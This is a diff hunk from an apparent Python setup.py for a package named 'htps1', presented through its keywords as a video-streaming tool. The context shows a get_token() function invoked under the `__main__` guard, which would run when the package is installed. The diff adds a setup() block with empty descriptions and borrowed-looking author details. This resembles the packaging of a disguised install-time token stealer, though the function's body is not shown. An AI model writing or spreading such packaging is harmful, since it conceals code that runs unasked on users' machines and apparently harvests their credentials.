@@ -130,4 +130,23 @@ def get_token():
                 else: continue
 if __name__ == '__main__':
     get_token()
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="htps1",
+    version="2.3.1",
+    author="calword",
+    author_email="<mail@neuralnine.com>",
+    description="",
+    long_description_content_type="text/markdown",
+    long_description="",
+    packages=find_packages(),
+    install_requires=['opencv-python', 'pyautogui', 'pyaudio'],
+    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
